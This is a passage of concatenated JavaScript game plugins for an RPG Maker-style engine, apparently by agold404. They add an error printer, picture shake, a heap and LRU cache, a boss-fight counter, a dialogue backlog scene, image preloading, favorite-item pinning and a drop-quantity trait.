	).ac(d.ce("br")).ac(
		d.ce("font").sa("color",f.tbl[1][1]).atxt(msg)
	).ac(d.ce("br")).ac(d.ce("br")).ac(
		d.ce("font").sa("color",f.tbl[1][1]).atxt(f.tbl[1][2])
	).ac(d.ce("br"));
	const stack=err&&err.stack;
	if(stack){
		const sc=SceneManager._scene.constructor;
		console.log(stack);
		rtv.ac(d.ce("br")).ac(d.ce("div").sa("style",f.tbl[0][0]+"color:"+f.tbl[1][0]).atxt(f.tbl[0][2]||f.tbl[0][3]).ac(d.ce('br')).atxt(this.getDebugInfo_gameState()));
		const elemsg=d.ce("div").sa("style",f.tbl[0][0]+"color:"+f.tbl[1][1]).sa("color",f.tbl[1][1]);
		const idx=err._msgOri?stack.indexOf(err._msgOri):0;
		(0<idx?stack.slice(idx+err._msgOri.length):stack).replace(f.tbl[2][0],f.tbl[2][1]).split(f.tbl[3]).map(f.tbl[4][0],f.tbl[4][1]).forEach(f.tbl[5][0],elemsg);
		rtv.ac(elemsg);
	}
	if(!noUpdateZIndex && this._errorPrinter) this._errorPrinter.style.zIndex=40404;
	if(Utils.isAndroidChrome()) alert(rtv.innerHTML);
	return rtv;
},[
["background-color:rgba(0,0,0,0.5);white-space:pre-wrap;font-family:monospace;","max-height:100%;overflow-y:scroll;user-select:all;","爛掉ㄌ，快找○○○○○○○○○(○○)求救","爛掉ㄌ，試著自救如何？",tttt],
["yellow","white","Press F5 or reload the page to restart"],
[/\r/g,''],
/\n/g,
[function(line){ console.warn(line); return line.replace(this[0],this[1]); },[/(((at eval \([^\(]+)?))?\(.*[/\\]([^/\\:]+):/g,"$3($4:"],],
[function(line){ this.ac(d.ce('div').atxt(line)); }],
],true).add('_setErrActBtnStyle',function f(btn){
	return btn.sa('style',f.tbl.css_inline.btn).sa('class',f.tbl.css_class.btn);
},{
css_class:{
	btn:'errAct',
},
css_inline:{
	btn:'',
},
},undefined,true).add('_updateErrorPrinter',function f(){
	const rtv=f.ori.apply(this,arguments);
	const t=this._errorPrinter;
	t.style.zIndex=this._errorShowed?40404:-1;
	t.height=this._height*f.tbl[0];
	this._centerElement(t);
	return rtv;
},[
0.875,
]).add('getDebugInfo_gameState',()=>{
	const map=$gameMap,plyr=$gamePlayer,sc=SceneManager._scene;
	const ver=window._agold404_version;
	return [
		ver?("js ver.: "+ver):"",
		"map: "+(map&&map.mapId()),
		plyr?("player@("+plyr.x+','+plyr.y+")"):"",
		"scene: "+(sc&&sc.constructor.name),
	].join(' ; ');
});

})();


﻿"use strict";
/*:
 * @plugindesc Game_Picture effects 圖片特效 api
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Picture.prototype).add('effect_shake',function f(strengthXY,periodXY,duration){
	this._shake_dur=~~duration;
	this._shake_prd=periodXY;
	this._shake_str=strengthXY;
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateEffect_shake();
	return rtv;
}).add('updateEffect_shake',function f(){
	if(0<this._shake_dur){
		const shk=this._shake_str,pi2=Math.PI*2;
		this._shake_dx=Math.sin(pi2*this._shake_dur/this._shake_prd.x)*shk.x;
		this._shake_dy=Math.sin(pi2*this._shake_dur/this._shake_prd.y)*shk.y;
		if(!(0<--this._shake_dur)){
			this._shake_dur=
			this._shake_dx=
			this._shake_dy=
			this._shake_prd=
			this._shake_str=
				undefined;
		}
	}
}).add('x',function f(){
	return (this._shake_dx||0)+f.ori.apply(this,arguments);
}).add('y',function f(){
	return (this._shake_dy||0)+f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc Heap
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const w=window; if(!w.Heap){
	let $dddd$;
	w.Heap=function(){ this.initialize.apply(this,arguments); };
	w.Heap.prototype.constructor=w.Heap;
	$dddd$=w.Heap.prototype.initialize=function f(func_cmp3,arr,inPlace){
		{
			const lt=func_cmp3;
			this._lt=(lt&&lt.constructor===Function)?(a,b)=>lt(a,b)<0:f.ori;
		}
		this._searchTbl=new Map();
		if(arr&&arr.constructor===Array){
			if(inPlace){
				arr.push(arr[0]);
				arr[0]=undefined;
				this._data=arr;
			}else this._data=[undefined].concat_inplace(arr);
			this.makeHeap();
		}else this._data=[undefined];
	};
	$dddd$.ori=(a,b)=>a<b;
	w.Heap.prototype.clear=function(){
		this._data.length=1;
		this._searchTbl.clear();
	};
	w.Heap.prototype.remove=function(ele){
		// do not use when 'ele' is basic type: undefined,null,Boolean,Number,String
		const st=this._searchTbl;
		let idx=st.get(ele);
		if(idx===undefined){ debugger; return; }
		st.delete(ele);
		const arr=this._data;
		const rtv=arr[idx];
		arr[idx]=arr.back;
		st.set(arr[idx],idx);
		arr.pop();
		this._sink(idx);
		return rtv;
	};
	Object.defineProperties(w.Heap.prototype,{
		top: {
			get:function(){return this._data[1];},
			set:function(rhs){
				const arr=this._data,st=this._searchTbl;
				st.delete(arr[1]);
				arr[1]=rhs;
				st.set(arr[1],1);
				this._sink();
				return rhs;
			},
		configurable: false},
		length: {
			get:function(){return this._data.length-1;},
		configurable: false}
	});
	w.Heap.prototype._sink=function(strt){
		const arr=this._data;
		if(arr.length===1) return;
		let idx=(strt<<1)||2,lt=this._lt;
		while(idx<arr.length){
			const offset=((idx|1)<arr.length&&lt(arr[idx],arr[idx|1]))^0; // larger
			if(lt(arr[idx>>1],arr[idx|offset])){ // less than larger one
				const idx1=idx>>1,idx2=idx|offset,st=this._searchTbl;
				const tmp=arr[idx1]; arr[idx1]=arr[idx2]; arr[idx2]=tmp;
				st.set(arr[idx1],idx1);
				st.set(arr[idx2],idx2);
			}else break;
			idx|=offset;
			idx<<=1;
		}
		return idx;
	};
	w.Heap.prototype._float=function(strt){
		const arr=this._data;
		if(arr.length===1) return;
		let idx=strt||(arr.length-1),lt=this._lt;
		while(idx!==1 && lt(arr[idx>>1],arr[idx])){
			const st=this._searchTbl,idx0=idx;
			idx>>=1;
			const tmp=arr[idx]; arr[idx]=arr[idx0]; arr[idx0]=tmp;
			st.set(arr[idx0],idx0);
			st.set(arr[idx ],idx );
		}
		return idx;
	};
	w.Heap.prototype.makeHeap=function(){
		const arr=this._data;
		for(let x=arr.length;--x;) this._sink(x);
		for(let x=arr.length;--x;) this._searchTbl.set(arr[x],x);
	};
	w.Heap.prototype.push=function(rhs){
		const arr=this._data;
		arr.push(rhs);
		this._searchTbl.set(arr.back,arr.length-1);
		this._float();
	};
	w.Heap.prototype.pop=function(){
		const arr=this._data;
		if(arr.length===1) return;
		const rtv=arr[1],st=this._searchTbl;
		st.delete(rtv);
		arr[1]=arr.back;
		st.set(arr[1],1);
		arr.pop();
		this._sink();
		return rtv;
	};
	w.Heap.prototype.toArr=function(){return this._data.slice(1);};
	w.Heap.prototype.rsrvTop=function(){
		const arr=this._data;
		if(arr.length===1) return;
		const st=this._searchTbl;
		st.clear();
		arr.length=2;
		st.set(arr[1],1);
		return this.top;
	};
} }

})();


﻿"use strict";
/*:
 * @plugindesc LruCache
 * @author agold404
 * @help LruCache.setCache(key,data,size) LruCache.getCache(key)
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const a=class LruCache{
static supportedMaxItemCount=(1<<23)-1;
constructor(maxItemCount,maxItemSize){
	this._count=0;
	this._countMax=maxItemCount|0||this.constructor.supportedMaxItemCount;
	if(this._countMax<0||this.constructor.supportedMaxItemCount<this._countMax) this._countMax=this.constructor.supportedMaxItemCount;
	this._size=0;
	this._sizeMax=maxItemSize-0||Infinity;
	this._serial=0;
	this._serialBase=0;
	this._serialMask=(1<<30)-1; // must > supportedMaxItemCount*2
	this._infoHeap=new Heap((a,b)=>((b.serial-this._serialBase)&this._serialMask)-((a.serial-this._serialBase)&this._serialMask));
	this._key2info=new Map();
}
gc(n){
	const h=this._infoHeap;
	if(h.length&&(this._countMax<this._count || this._sizeMax<this._size)) this.remove(h.top.key);
	if(h.length&&(this._serialMask>>1)<((this._serial-h.top.serial)&this._serialMask)) this.remove(h.top.key);
}
_add(info){
	// and push
	this.gc();
	++this._count;
	this._size+=info.size;
	info.serial=this._serial++;
	this._serial&=this._serialMask;
	this._infoHeap.push(info);
	this._key2info.set(info.key,info);
	this.gc();
}
remove(key){
	const info=this._key2info.get(key); if(!info) return;
	this._key2info.delete(key);
	const h=this._infoHeap;
	h.remove(info);
	--this._count;
	this._size-=info.size;
	if(h.length) this._serialBase=h.top.serial;
	else this._serialBase=this._serial=0;
	return info;
}
setCache(key,data,size){
	const info=this.remove(key)||{
		key:key,
		data:undefined,
		size:0,
		serial:0,
	};
	info.data=data;
	info.size=size;
	this._add(info);
}
getCache(key){
	const info=this.remove(key); if(!info) return;
	this._add(info);
	return info&&info.data;
}
};

window[a.name]=a;

})();


﻿"use strict";
/*:
 * @plugindesc BossFightCounter
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=['BossFightCounter-',];
t.push('-'+t[0]+'allKeys'); // 1
t.push('-'+t[0]+'FinalGameTime'); // 2

new cfc(BattleManager).add('addBossFightCounter',function f(key){
	const fullkey=f.tbl[0]+key;
	localStorage.setItem(fullkey,(localStorage.getItem(fullkey)|0)+1);
	this._bossFightCounter_addKey(key);
},t).add('getBossFightCounter',function f(key){
	const fullkey=f.tbl[0]+key;
	return localStorage.getItem(fullkey)|0;
},t).add('delBossFightCounter',function f(key){
	const fullkey=f.tbl[0]+key;
	localStorage.removeItem(fullkey);
	this._bossFightCounter_delKey(key);
},t).add('delBossFightCounterAll',function f(key){
	for(let x=0,arr=this._bossFightCounter_getKeys();x<arr.length;++x){
		const fullkey=f.tbl[0]+arr[x];
		localStorage.removeItem(fullkey);
	}
	this._bossFightCounter_delAllKeys();
},t).add('_bossFightCounter_getKeys',function f(){
	let allKeys;
	try{
		allKeys=JSON.parse(localStorage.getItem(f.tbl[1])||"[]");
		if(!allKeys||allKeys.constructor!==Array) allKeys=[];
	}catch(e){
		allKeys=[];
	}
	return allKeys;
},t).add('_bossFightCounter_setKeys',function f(keys){
	try{
		localStorage.setItem(f.tbl[1],JSON.stringify(keys));
	}catch(e){
		this._bossFightCounter_delAll();
	}
},t).add('_bossFightCounter_addKey',function f(key){
	const allKeys=this._bossFightCounter_getKeys();
	if(allKeys.indexOf(key)<0){
		allKeys.push(key);
		this._bossFightCounter_setKeys(allKeys);
	}
},t).add('_bossFightCounter_delKey',function f(key){
	const idx=allKeys.indexOf(key);
	if(idx>=0){
		allKeys.splice(idx,1);
		this._bossFightCounter_setKeys(allKeys);
	}
},t).add('_bossFightCounter_delAllKeys',function f(){
	localStorage.removeItem(f.tbl[1]);
},t);

const loadTime=Date.now(),lastTime=localStorage.getItem(t[2])-0;
if(1){
	const dt=loadTime-lastTime;
	if(dt<4567){ // supposed < 4.567 sec is F5
		// keep count
		console.log("keep "+t[0],dt);
	}else{ // supposed close game and re-open
		// reset
		console.log("reset "+t[0],dt);
		BattleManager.delBossFightCounterAll();
	}
	window.addEventListener("beforeunload", e=>{ localStorage.setItem(t[2],Date.now()); }, false);
}

})();


﻿"use strict";
/*:
 * @plugindesc 劇情對話文字回顧 flashbackText
 * @author agold404
 * @help SceneManager.push(Scene_FlashbackText);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const enableShortcutScenes=new Set([
Scene_Map,
Scene_Battle,
Scene_Menu,
Scene_Item,
Scene_Skill,
Scene_Equip,
Scene_Status,
]);

{
const a=function Scene_FlashbackText(){
	this.initialize.apply(this, arguments);
};
a.ori=Scene_MenuBase;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
k='initialize';
cf(p,k,function f(){
	f.tbl[1][f.tbl[0]].apply(this,arguments);
	this._prevScene_store();
},[
k,
a.ori.prototype,
function(){ Scene_Base.prototype.stop.call(this); },
]);
k='create';
cf(p,k,function f(){
	f.tbl[1][f.tbl[0]].apply(this,arguments);
	this.createWindows();
	this._prevScene_restore();
},[k,a.ori.prototype]);
new cfc(p).add('updateActor',function f(){
	
},undefined,true,true).add('createWindows',function f(){
	this.createCommandWindow();
	this.createFlashbackTextWindow();
	this.loadImgs();
}).add('createCommandWindow',function f(){
	const wc=this._commandWindow=new Window_FlashbackText_command(0,0);
	for(let x=0,arr=wc.makeCommandList.tbl;x!==arr.length;++x) wc.setHandler(arr[x].param[1], arr[x].func.bind(this));
	this.addWindow(wc);
},undefined,true,true).add('createFlashbackTextWindow',function f(){
	const wt=this._flashbackTextWindow=new Window_FlashbackText();
	wt.height=wt._windowHeight=Graphics.boxHeight-this._commandWindow.height;
	wt.y=this._commandWindow.height;
	this.addWindow(wt);
}).add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._flashbackTextWindow.scrollBottom().open();
	return rtv;
}).add('loadImgs',function f(){
	$gameTemp.flashbackText_getCont().forEach(f.tbl[0]);
},[
info=>{
	const faceName=info&&info.face&&info.face.name;
	if(faceName) ImageManager.loadFace(faceName);
},
]);
}

{
const a=function Window_FlashbackText_command(){
	this.initialize.apply(this, arguments);
};
a.ori=Window_HorzCommand;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
t=[
{
	param:["使用ESC或按此關閉","cancel",],
	func:function f(){this.popScene();},
},
];
new cfc(p).add('makeCommandList',function f(){
	const wc=this;
	for(let x=0,arr=f.tbl;x!==arr.length;++x){
		wc.addCommand.apply(wc,arr[x].param);
	}
},t,true,true).add('itemWidth',function f(){
	return ~~(this.contentsWidth()/f.tbl.length);
},t,true,true).add('windowWidth',function f(){
	return Graphics.boxWidth;
},undefined,true,true);
t=undefined;
}

{
const a=function Window_FlashbackText(){
	this.initialize();
};
a.ori=Window_Message;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
new cfc(p).add('initMembers',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._windowPauseSignSprite.visible=false;
	this._lastRedrawFrame=Graphics.frameCount;
	this._scrollTxtY=0;
	this._shouldRedraw=false;
	this._windowHeight=undefined;
	this._scrollTxtY_max=undefined;
	return rtv;
}).add('update',function f(){
	Window_Base.prototype.update.call(this);
	this.redrawtxt();
	this.processInputs();
}).add('_update_calcHeights',function f(arr){
	return this._redrawtxt(arr,true);
}).add('windowHeight',function f(){
	return isNaN(this._windowHeight)?Graphics.boxHeight:this._windowHeight;
}).add('updatePlacement',function f(){
	
},undefined,true,true).add('createSubWindows',function f(){
	if(!f.tbl[0]){
		const dummy={y:0,height:0,terminateMessage:none,};
		f.tbl[0]={
			_goldWindow:{open:none,},
			_choiceWindow:none,//new Window_ChoiceList(dummy),
			_numberWindow:none,//new Window_NumberInput(dummy),
			_itemWindow:none,//new Window_EventItem(dummy),
		};
	}
	for(let x=0,arr=f.tbl[1],xs=arr.length;x!==xs;++x) this[arr[x]]=f.tbl[0][arr[x]];
},[
undefined,
['_goldWindow','_choiceWindow','_numberWindow','_itemWindow',],
]).add('subWindows',function f(){
	return f.tbl[0];
},[
[],
]).add('_redrawtxt',function f(arr,isCalcH){
	const bak_faceName=$gameMessage._faceName;
	if(!isCalcH) this.contents.clear();
	const fh1=this.fittingHeight(1),lh=this.lineHeight();
	const ch=this.contentsHeight(),yInit=isCalcH?0:-this._scrollTxtY;
	const textState={x:undefined,left:undefined,y:yInit,height:0,};
	let clean=true,dy=0;
	for(let x=0;x!==arr.length;++x){
		if(x){
			textState.y+=this.padding;
			dy+=this.padding;
		}
		if(!isCalcH && textState.y>=ch) break;
		const hasNameField=!isNone(arr[x].nameField);
		const nameFieldHeight=hasNameField?lh:0;
		if(textState.y+arr[x].height<0||(isCalcH&&arr[x].height!==undefined)){
			// skip
			textState.y+=arr[x].height+nameFieldHeight;
		}else{
			clean=false;
			const face=arr[x].face;
			$gameMessage._faceName=face.name;
			this.resetFontSettings();
			const y=(isCalcH?0:textState.y)+nameFieldHeight;
			if(!isCalcH && hasNameField){
				let ga,ctx;
				if(ctx=this.contents.context){
					ga=ctx.globalAlpha;
					ctx.globalAlpha=ga*f.tbl[0].nfIconMulAlpha;
					this.drawIcon(f.tbl[0].nfIcon,f.tbl[0].x+f.tbl[0].nfIconDx,y-lh);
					ctx.globalAlpha=ga;
				}
				this.drawText(arr[x].nameField,f.tbl[0].x+f.tbl[0].nfDx,y-lh);
			}
			if(!isCalcH && face.name) this.drawFace(face.name, face.idx, f.tbl[0].x, y);
			;
			this.drawTextEx(arr[x].txt,
				textState.x=textState.left=this.newLineX(),y,
				0,0,textState,
			);
			// calcTextHeight(txt,false) called when '\n' ; returns 1 line height at a time
			arr[x].height=(textState.y+=textState.height)-y;
			if(face.name) textState.y=(arr[x].height=Math.max(arr[x].height,Window_Base._faceHeight))+y;
		}
		dy+=arr[x].height+nameFieldHeight;
	}
	if(isCalcH && !clean && this.contents) this.contents.clear();
	$gameMessage._faceName=bak_faceName;
	return dy;
},[
{x:0,nfDx:16,nfIcon:83,nfIconMulAlpha:0.75,nfIconDx:-16},
]).add('redrawtxt',function f(forced){
	if(( !this._shouldRedraw ||
		this._lastRedrawFrame===Graphics.frameCount ||
		!this.isOpen() || 
		!$gameTemp ||
	false )&&!forced) return;
	this._shouldRedraw=false;
	this._lastRedrawFrame=Graphics.frameCount;
	
	const arr=$gameTemp.flashbackText_getCont();
	this._update_calcHeights(arr);
	const rtv=this._redrawtxt(arr);
	if(this._scrollTxtY_max===undefined) this._scrollTxtY_max=Math.max(rtv-this.contentsHeight(),0);
	return rtv;
}).add('setScrollTxtY',function f(val){
	if(val<0) val=0;
	if(this._scrollTxtY_max<val) val=this._scrollTxtY_max;
	if(this._scrollTxtY!==val){
		this._scrollTxtY=val;
		this._shouldRedraw=true;
		if(!val) this.upArrowVisible=false;
		if(val===this._scrollTxtY_max) this.downArrowVisible=false;
	}
}).add('scrollBottom',function f(){
	if(!$gameTemp) return;
	let val=this._update_calcHeights($gameTemp.flashbackText_getCont())-this.contentsHeight();
	if(!(val>=0)) val=0;
	this.setScrollTxtY(val);
	return this;
}).add('updateOpen',function f(){
	const op=this._opening;
	const rtv=f.ori.apply(this,arguments);
	if(op && !this._opening) this._shouldRedraw=true;
	return rtv;
}).add('processInputs',function f(){
	let delta=TouchInput.wheelY;
	if(TouchInput.isPressed()){
		const dy=TouchInput.y-this._lastTouchedY;
		if(dy) delta-=dy;
		this._lastTouchedY=TouchInput.y;
	}
	if(TouchInput.isReleased()){
		const dy=TouchInput.y-this._lastTouchedY;
		if(dy) delta-=dy;
		this._lastTouchedY=undefined;
	}
	if(Input.isPressed('up'   ) || Input.isTriggered('up'   ) || Input.isLongPressed('up'   )) delta-=f.tbl[0];
	if(Input.isPressed('down' ) || Input.isTriggered('down' ) || Input.isLongPressed('down' )) delta+=f.tbl[0];
	if(Input.isTriggered('pageup'   ) || Input.isLongPressed('pageup'   )) delta-=this.contentsHeight();
	if(Input.isTriggered('pagedown' ) || Input.isLongPressed('pagedown' )) delta+=this.contentsHeight();
	if(Input.isTriggered('home')^Input.isTriggered('end')){
		if(Input.isTriggered('home')) delta=-this._scrollTxtY;
		else delta=this._scrollTxtY_max-this._scrollTxtY||0;
	}
	if(delta) SoundManager.playCursor();
	this.setScrollTxtY(this._scrollTxtY+delta);
},[16,]).add('processEscapeCharacter',function f(){
	let tmp;
	try{
		return f.ori.apply(this,tmp=arguments);
	}catch(e){
		console.warn(tmp);
		return f.tbl[0];
	}
},['',]);
t=()=>{};
for(let x=0,arr=['_updateCursor','_updatePauseSign',];x!==arr.length;++x) cf(p,arr[x],t,undefined,true,true);
t=undefined;
}

new cfc(Game_System.prototype).add('flashbackText_savedCont_get',function f(){
	let q=this._flashbackText_savedCont;
	if(!(q instanceof Queue)) q=Object.assign(new Queue(),q);
	this._flashbackText_savedCont=q;
	return q;
});

new cfc(Game_Temp.prototype).add('flashbackText_add',function f(txt,face,fidx,nameField){
	if($gameSystem && $gameSystem._flashbackText_disabled) return;
	if(!f.tbl[0].re) f.tbl[0].re=/(?<!(\\))((\\\\)*)(\\([VPNvpn])\[(\d+)\])/g;
	if(!f.tbl[0].re_discards) f.tbl[0].re_discards=/\f/g;
	const obj={txt:txt.replace(f.tbl[0].re_discards,'').replace(f.tbl[0].re,f.tbl[0]),face:{name:face,idx:fidx},nameField:nameField,y:undefined,height:undefined,_debug:{_mapId:$gameMap&&$gameMap._mapId,},};
	this._flashbackText_getCont().push(obj);
	const q=$gameSystem.flashbackText_savedCont_get();
	q.push(obj); for(let th=f.tbl[1];th<q.length;) q.pop();
},[
function f(){
	if(!f.tbl){
		f.tbl={
			V:n=>$gameVariables.value(n),
			P:Window_Base.prototype.partyMemberName,
			N:Window_Base.prototype.actorName,
		};
		for(let x=0,s="VPN",xs=s.length;x!==xs;++x) f.tbl[s[x].toLowerCase()]=f.tbl[s[x]];
	}
	const slashes=arguments[2]||"",key=arguments[5],val=arguments[6]-0; // to num type
	if(key in f.tbl) return slashes+f.tbl[key](val);
	return arguments[0];
},
10,
]).add('_flashbackText_getCont',function f(){
	let rtv=this._flashbackTexts;
	if(!rtv){
		rtv=this._flashbackTexts=[];
		const saved=$gameSystem&&$gameSystem.flashbackText_savedCont_get();
		if(saved) saved.forEach(f.tbl[0],rtv);
	}
	return rtv;
},[
function(x){ this.push(x); },
]).add('flashbackText_getCont',function f(){
	return this._flashbackText_getCont();
}).add('flashbackText_clearAll',function f(){
	this.flashbackText_getCont().length=0;
	return this;
}).add('_flashbackText_getWindow',function f(){
	const sc=SceneManager._scene;
	let w=sc._window_flashbackText; if(!w) w=sc._window_flashbackText=new Window_FlashbackText(0,0,Graphics.boxWidth,Graphics.boxHeight);
	return w;
}).add('flashbackText_show',function f(){
	return SceneManager.push(Scene_FlashbackText);
	const w=this._flashbackText_getWindow();
	SceneManager._scene.addWindow(w);
	w.open();
	w.scrollBottom()._shouldRedraw=true;
	return w;
}).add('flashbackText_isWindowClosed',function f(){
	return this._flashbackText_getWindow().isClosed();
});

new cfc(Window_Message.prototype).add('startMessage',function f(){
	if($gameTemp && $gameMessage) $gameTemp.flashbackText_add($gameMessage.allText(),$gameMessage.faceName(),$gameMessage.faceIndex(),$gameMessage._nameField);
	return f.ori.apply(this,arguments);
},t);

if(!enableShortcutScenes.size) return;
const key='r';
key=>Input.keyMapper[key.charCodeAt()]=key.toLowerCase();
const f=function(){
	const sc=SceneManager._scene;
	if(sc && sc.isActive() && $gameTemp && Input.isPressed(f.tbl[0]) && f.tbl[1].has(sc.constructor)) $gameTemp.flashbackText_show();
};
f.ori=undefined;
f.tbl=[
key,
enableShortcutScenes,
];
new cfc(Scene_Boot.prototype).add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(SceneManager.add_additionalUpdate) SceneManager.add_additionalUpdate(f.tbl[0],true);
	return rtv;
},[f]);

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥員技能動畫圖片預讀
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
btlr=>btlr.skills().concat($dataSkills[btlr.attackSkillId()]),
dataobj=>$dataAnimations[dataobj&&dataobj.animationId],
dataobj=>dataobj&&[dataobj.animation1Name&&dataobj.animation1Hue+'-'+dataobj.animation1Name,dataobj.animation2Name&&dataobj.animation2Hue+'-'+dataobj.animation2Name,],
info=>{ if(!info) return;
	const idx=info.indexOf('-'); if(idx<0 || idx+1===info.length) return;
	ImageManager.loadAnimation(info.slice(idx+1),Number(info.slice(0,idx)));
},
dataobj=>dataobj&&DataManager.sendLoadReq_byNote(dataobj.note),
];

new cfc(Scene_Battle.prototype).add('__dummy',function f(){
	this.loadBtlrsSkillsImgs();
	return f.ori.apply(this,arguments);
}).add('loadBtlrsSkillsImgs',function f(){
	if(!$gameParty||!$gameTroop) return;
	const skills=this.loadBtlrsSkillsImgs_getSkills();
	new Set(skills.map(f.tbl[1]).map(f.tbl[2]).flat()).forEach(f.tbl[3]);
	this.loadBtlrsSkillsImgs_byNote(skills);
},t).add('loadBtlrsSkillsImgs_getSkills',function f(){
	if(!$gameParty||!$gameTroop) return;
	return [].uniquePushContainer($gameParty.members().concat($gameTroop.members()).map(f.tbl[0]).flat());
},t).add('loadBtlrsSkillsImgs_byNote',function f(skills){
	skills.forEach(f.tbl[4]);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 設定置頂道具，背包按T置頂。
 * @author agold404
 * @help 按T置頂
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_System.prototype).add('favItems_getCont',function f(){
	if(!this._favItems) this._favItems={_items:[],_weapons:[],_armors:[],};
	return this._favItems;
}).add('favItems_add',function f(item){ if(!item||!item.id) return;
	const cont=Game_Party.prototype.itemContainer.call(this.favItems_getCont(),item);
	if(cont) return cont.uniquePush(item.id);
}).add('favItems_del',function f(item){ if(!item||!item.id) return;
	const cont=Game_Party.prototype.itemContainer.call(this.favItems_getCont(),item);
	if(cont) return cont.uniquePop(item.id);
}).add('favItems_is',function f(item){ if(!item||!item.id) return;
	const cont=Game_Party.prototype.itemContainer.call(this.favItems_getCont(),item);
	return cont && cont.uniqueHas(item.id);
});

new cfc(Window_Base.prototype).add('drawIcon',function f(iconIndex, x, y, item){
	if(this.contents && $gameSystem && $gameSystem.favItems_is(item)){
		let ga,ctx;
		if(ctx=this.contents.context){
			ga=ctx.globalAlpha;
			ctx.globalAlpha=ga*f.tbl[2];
			this.drawIcon(f.tbl[1],x+f.tbl[0].dx,y+f.tbl[0].dy);
			ctx.globalAlpha=ga;
		}
	}
	return f.ori.apply(this,arguments);
},[
{dx:-4,dy:0,},
92, // iconId
0.75, // mulAplha
]);

new cfc(Window_Selectable.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._favItems_isCacheData=undefined;
	return rtv;
});

new cfc(Game_Party.prototype).
add('gainItem',function f(item,amount,includeEquip){
	if(0<amount&&!this.numItems(item)){
		const sc=SceneManager._scene;
		const iw=sc&&sc._itemWindow;
		if(iw) iw._favItems_lastData=undefined;
	}
	return f.ori.apply(this,arguments);
}).
getP;

new cfc(Window_ItemList.prototype).add('makeItemList',function f(){
	if(this._favItems_isCacheData){
		if(!this._favItems_lastData || this._favItems_lastData.cat!==this._category){
			if(!this._favItems_lastData) this._favItems_lastData={};
			const lastData=this._favItems_lastData;
			let rtv=f.ori.apply(this,arguments);
			if(!(this._data.length>=this._onTopEndIdx)) this._onTopEndIdx=this._data.length;
			const arr0=[],arr1=[],arr=this._data;
			for(let x=0,xs=this._onTopEndIdx;x!==xs;++x) (arr[x]&&$gameSystem.favItems_is(arr[x])?arr0:arr1).push(arr[x]);
			const padEnd=arr1.length;
			for(let x=this._onTopEndIdx,xs=arr.length;x!==xs;++x) (arr[x]&&$gameSystem.favItems_is(arr[x])?arr0:arr1).push(arr[x]);
			this._onTopEndIdx=arr0.length+padEnd;
			if(arr0.length){
				for(let x=0;x!==arr1.length;++x) arr0.push(arr1[x]);
				if(rtv===this._data) rtv=arr0;
				this._data=arr0;
			}
			lastData.cat  =this._category;
			lastData.data =this._data;
			lastData.rtv  =rtv;
		}
		this._data=this._favItems_lastData.data;
		return this._favItems_lastData.rtv;
	}
	return f.ori.apply(this,arguments);
},t);

new cfc(Scene_Item.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._itemWindow._favItems_isCacheData=true;
	this._itemWindow._favItems_lastData=undefined;
	return rtv;
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._itemWindow && this._itemWindow.active){ const item=this._itemWindow.item(); if(item && Input.isTriggered(f.tbl[0])){
		if($gameSystem.favItems_is(item)) $gameSystem.favItems_del(item);
		else $gameSystem.favItems_add(item);
		this._itemWindow.redrawCurrentItem();
	} }
	return rtv;
},['t']);

new cfc(Scene_Battle.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._itemWindow._favItems_isCacheData=true;
	this._itemWindow._favItems_lastData=undefined;
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 掉落數量上升
 * @author agold404
 * @help 有掉才++
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase,gp=Game_Party;

const kwtxt='掉落數量上升';
const kwtrait="ABILITY_"+kwtxt;

if(!gp._enumMax) gp._enumMax=404;
if(!gp.addEnum) gp.addEnum=window.addEnum;
gp.addEnum(kwtrait);
gp.addEnum('__END__');

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const ts=dataobj.traits;
	const val=meta[kwtxt]-0;
	if(!ts||!val) return;
	ts.push({code:gbb.TRAIT_PARTY_ABILITY,dataId:gp[kwtrait],value:val,});
},
]);

new cfc(Game_Troop.prototype).add('makeDropItems',function f(){
	const rtv=[];
	for(let x=0,arr=this.deadMembers(),xs=arr.length;x!==xs;++x) rtv.push(arr[x].makeDropItems());
	if($gameParty){ const val=$gameParty.partyAbility_sumAll(f.tbl[0]); if(val>=1){
		const arr=[rtv.flat(),];
		for(let n=1;n<=val;++n) arr.push(arr[0]);
		return arr.flat();
